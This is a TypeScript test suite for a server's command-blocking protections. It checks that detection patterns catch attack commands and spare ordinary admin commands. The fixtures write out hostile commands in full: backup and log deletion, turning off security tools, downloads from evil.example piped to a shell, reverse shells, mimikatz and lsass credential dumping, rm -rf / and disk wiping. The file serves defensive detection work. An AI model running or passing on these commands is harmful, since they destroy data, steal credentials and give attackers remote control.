// Command blocking protections: every pattern compiles, Windows patterns never match a core Windows
// process, each protection catches real attack commands and leaves everyday commands alone.
// Run with: npm test -w @em/server
import { test } from "node:test";
import assert from "node:assert/strict";
import { COMMAND_PROTECTIONS, commandBlockRuleProblem, type CommandProtectionOs } from "@em/shared";

const matches = (key: string, os: CommandProtectionOs, cmd: string) =>
  (COMMAND_PROTECTIONS.find((p) => p.key === key)?.patterns[os] ?? []).some((p) => new RegExp(p, "i").test(cmd));
const anyMatch = (os: CommandProtectionOs, cmd: string) =>
  COMMAND_PROTECTIONS.flatMap((p) => p.patterns[os] ?? []).filter((p) => new RegExp(p, "i").test(cmd));

test("command protections: patterns compile and Windows ones never match core Windows processes", () => {
  const keys = new Set<string>();
  for (const p of COMMAND_PROTECTIONS) {
    assert.ok(!keys.has(p.key), `duplicate key ${p.key}`);
    keys.add(p.key);
    assert.ok(Object.values(p.patterns).some((list) => list && list.length > 0), `${p.key} has no patterns`);
    for (const [os, list] of Object.entries(p.patterns)) {
      for (const pattern of list ?? []) {
        assert.doesNotThrow(() => new RegExp(pattern, "i"), `${p.key}/${os}: ${pattern}`);
        if (os === "win32") assert.equal(commandBlockRuleProblem("COMMAND_PATTERN", pattern), null, `${p.key}: ${pattern}`);
      }
    }
  }
  assert.equal(commandBlockRuleProblem("PROTECTION", "BACKUP_DELETION"), null);
  assert.ok(commandBlockRuleProblem("PROTECTION", "rm -rf /"), "only catalogue keys are accepted");
});

const MUST_MATCH: [string, CommandProtectionOs, string][] = [
  ["BACKUP_DELETION", "win32", "vssadmin.exe Delete Shadows /All /Quiet"],
  ["BACKUP_DELETION", "win32", "C:\\Windows\\System32\\wbem\\WMIC.exe shadowcopy delete"],
  ["BACKUP_DELETION", "win32", "wbadmin delete catalog -quiet"],
  ["BACKUP_DELETION", "win32", "powershell -c \"Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete()}\""],
  ["BACKUP_DELETION", "darwin", "/usr/bin/tmutil disable"],
  ["RECOVERY_DISABLE", "win32", "bcdedit /set {default} recoveryenabled No"],
  ["RECOVERY_DISABLE", "win32", "reagentc /disable"],
  ["SECURITY_TOOLS_OFF", "win32", "powershell Set-MpPreference -DisableRealtimeMonitoring $true"],
  ["SECURITY_TOOLS_OFF", "win32", "netsh advfirewall set allprofiles state off"],
  ["SECURITY_TOOLS_OFF", "win32", "sc stop WinDefend"],
  ["SECURITY_TOOLS_OFF", "linux", "/usr/sbin/ufw disable"],
  ["SECURITY_TOOLS_OFF", "linux", "systemctl stop firewalld"],
  ["SECURITY_TOOLS_OFF", "linux", "setenforce 0"],
  ["SECURITY_TOOLS_OFF", "darwin", "spctl --master-disable"],
  ["LOG_WIPING", "win32", "wevtutil cl Security"],
  ["LOG_WIPING", "win32", "powershell Clear-EventLog -LogName System"],
  ["LOG_WIPING", "linux", "rm -rf /var/log/auth.log"],
  ["LOG_WIPING", "darwin", "log erase --all"],
  ["TOOL_DOWNLOADS", "win32", "certutil.exe -urlcache -split -f http://evil.example/a.exe a.exe"],
  ["TOOL_DOWNLOADS", "win32", "bitsadmin /transfer job http://evil.example/a.exe C:\\a.exe"],
  ["TOOL_DOWNLOADS", "win32", "powershell IEX (New-Object Net.WebClient).DownloadString('http://evil.example/x')"],
  ["TOOL_DOWNLOADS", "win32", "mshta http://evil.example/x.hta"],
  ["TOOL_DOWNLOADS", "linux", "sh -c curl -fsSL http://evil.example/x.sh | bash"],
  ["TOOL_DOWNLOADS", "darwin", "/bin/bash -c curl -s https://evil.example/i.sh | sudo sh"],
  ["ENCODED_POWERSHELL", "win32", "powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"],
  ["ENCODED_POWERSHELL", "win32", "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0A"],
  ["ACCOUNT_CREATION", "win32", "net user hacker P@ss123 /add"],
  ["ACCOUNT_CREATION", "win32", "net localgroup administrators hacker /add"],
  ["ACCOUNT_CREATION", "linux", "useradd -m hacker"],
  ["ACCOUNT_CREATION", "linux", "/usr/sbin/usermod -aG sudo hacker"],
  ["ACCOUNT_CREATION", "darwin", "sysadminctl -addUser hacker -password x -admin"],
  ["DISK_WIPING", "win32", "format D: /q /y"],
  ["DISK_WIPING", "win32", "diskpart /s wipe.txt"],
  ["DISK_WIPING", "win32", "cipher /w:C:"],
  ["DISK_WIPING", "linux", "mkfs.ext4 /dev/sdb1"],
  ["DISK_WIPING", "linux", "dd if=/dev/zero of=/dev/sda bs=1M"],
  ["DISK_WIPING", "darwin", "diskutil eraseDisk JHFS+ Empty disk2"],
  ["SYSTEM_DELETION", "win32", "cmd /c rd /s /q C:\\"],
  ["SYSTEM_DELETION", "win32", "cmd.exe /c del /f /s /q C:\\Windows\\*"],
  ["SYSTEM_DELETION", "linux", "rm -rf /"],
  ["SYSTEM_DELETION", "linux", "rm -rf --no-preserve-root /"],
  ["SYSTEM_DELETION", "linux", "/bin/rm -fr /etc"],
  ["SYSTEM_DELETION", "darwin", "rm -rf /Users"],
  ["HIDDEN_AUTOSTART", "win32", "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upd /d C:\\x.exe"],
  ["HIDDEN_AUTOSTART", "win32", "schtasks /create /tn upd /tr C:\\x.exe /sc onlogon /ru SYSTEM"],
  ["REVERSE_SHELLS", "win32", "nc.exe 203.0.113.5 4444 -e cmd.exe"],
  ["REVERSE_SHELLS", "linux", "bash -i >& /dev/tcp/203.0.113.5/4444 0>&1"],
  ["REVERSE_SHELLS", "linux", "python3 -c import socket,subprocess,os;s=socket.socket();os.dup2(s.fileno(),0);subprocess.call(['/bin/sh','-i'])"],
  ["REVERSE_SHELLS", "darwin", "nc -e /bin/sh 203.0.113.5 4444"],
  ["PASSWORD_THEFT", "win32", "mimikatz.exe privilege::debug sekurlsa::logonpasswords"],
  ["PASSWORD_THEFT", "win32", "reg save HKLM\\SAM C:\\sam.save"],
  ["PASSWORD_THEFT", "win32", "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 624 C:\\lsass.dmp full"],
  ["PASSWORD_THEFT", "linux", "cat /etc/shadow"],
  ["PASSWORD_THEFT", "darwin", "security dump-keychain -d login.keychain"],
  ["SECURITY_WEAKENING", "win32", "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f"],
  ["SECURITY_WEAKENING", "win32", "bcdedit /set testsigning on"],
  ["SECURITY_WEAKENING", "linux", "chmod 4755 /bin/bash"],
  ["SECURITY_WEAKENING", "linux", "chmod -R 777 /"],
  ["SECURITY_WEAKENING", "darwin", "csrutil disable"],
  ["UPDATES_OFF", "win32", "sc config wuauserv start= disabled"],
  ["UPDATES_OFF", "win32", "net stop wuauserv"],
  ["UPDATES_OFF", "linux", "systemctl disable --now unattended-upgrades"],
  ["UPDATES_OFF", "darwin", "softwareupdate --schedule off"],
];

test("command protections catch real attack commands", () => {
  for (const [key, os, cmd] of MUST_MATCH) assert.ok(matches(key, os, cmd), `${key} (${os}) should catch: ${cmd}`);
});

const MUST_NOT_MATCH: [CommandProtectionOs, string][] = [
  ["win32", "vssadmin list shadows"],
  ["win32", "certutil -hashfile setup.exe SHA256"],
  ["win32", "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\scripts\\report.ps1"],
  ["win32", "powershell.exe -ExecutionPolicy RemoteSigned -Command Get-Process"],
  ["win32", "net user"],
  ["win32", "net localgroup administrators"],
  ["win32", "netsh advfirewall show allprofiles"],
  ["win32", "sc query WinDefend"],
  ["win32", "bcdedit /enum"],
  ["win32", "wevtutil qe System /c:5"],
  ["win32", "schtasks /create /tn backup /tr C:\\backup.cmd /sc daily /st 22:00"],
  ["win32", "cmd /c rd /s /q C:\\Users\\me\\AppData\\Local\\Temp\\build"],
  ["win32", "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer"],
  ["win32", "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule"],
  ["win32", "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"],
  ["linux", "rm -rf ./build"],
  ["linux", "rm -rf /tmp/cache"],
  ["linux", "rm -rf /home/user/project/node_modules"],
  ["linux", "useradd --system --no-create-home postgres"],
  ["linux", "adduser --system --group mysql"],
  ["linux", "passwd"],
  ["linux", "/usr/sbin/unix_chkpwd user nullok"],
  ["linux", "apt-get install -y nginx"],
  ["linux", "systemctl restart firewalld"],
  ["linux", "systemctl status unattended-upgrades"],
  ["linux", "dd if=/dev/sda of=/backup/disk.img"],
  ["linux", "chmod 755 /usr/local/bin/tool"],
  ["linux", "curl -fsSL https://example.com/file.tar.gz -o file.tar.gz"],
  ["linux", "journalctl --vacuum-time=2weeks"],
  ["darwin", "diskutil list"],
  ["darwin", "tmutil listbackups"],
  ["darwin", "security find-certificate -a"],
  ["darwin", "rm -rf /Users/me/Library/Caches/tmp"],
  ["darwin", "/usr/sbin/softwareupdate --list"],
];

test("command protections leave everyday commands alone", () => {
  for (const [os, cmd] of MUST_NOT_MATCH) {
    const hit = anyMatch(os, cmd);
    assert.equal(hit.length, 0, `(${os}) should allow: ${cmd} - matched ${hit.join(" | ")}`);
  }
});

test("the console's display copy matches the catalogue", async () => {
  const { COMMAND_PROTECTION_LABELS } = await import("../../console/src/commandProtectionLabels");
  const { commandProtectionOses } = await import("@em/shared");
  assert.deepEqual(
    COMMAND_PROTECTION_LABELS.map((l) => [l.key, l.title, l.description, l.oses]),
    COMMAND_PROTECTIONS.map((p) => [p.key, p.title, p.description, commandProtectionOses(p)]),
    "update packages/console/src/commandProtectionLabels.ts to match packages/shared/src/data/commandProtections.ts",
  );
});
